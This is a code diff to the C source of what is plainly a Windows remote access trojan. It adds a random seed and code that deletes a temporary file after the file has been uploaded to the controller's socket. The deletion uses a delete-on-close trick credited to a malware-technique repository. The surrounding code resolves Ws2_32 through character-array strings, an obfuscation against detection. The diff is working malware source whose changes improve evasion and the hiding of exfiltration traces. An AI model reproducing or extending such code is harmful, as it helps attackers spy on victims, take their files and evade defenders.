@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 
 // Ws2_32.dll definitions
 typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
@@ -109,6 +110,8 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
+	srand( (unsigned)time( NULL ) );
+	
 	RATSocket ratSocket = {};
 	
 	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
@@ -313,6 +316,15 @@ WinMain(HINSTANCE hInstance,
 			CloseHandle(pi.hThread);
 
 			SocketUploadFile(&ratSocket, filePath);
+
+			// Alternative way to delete the temporary file. More info here: https://github.com/vxunderground/WinAPI-Tricks/blob/main/Kernel32/DeleteFileAlt/DeleteFileAltA.c
+			HANDLE handle = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+			if ( handle == INVALID_HANDLE_VALUE )
+			{
+				OutputDebugStringA("Error deleting file at");
+				OutputDebugStringA(filePath);
+			}
+			CloseHandle(handle);
 		}
 		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
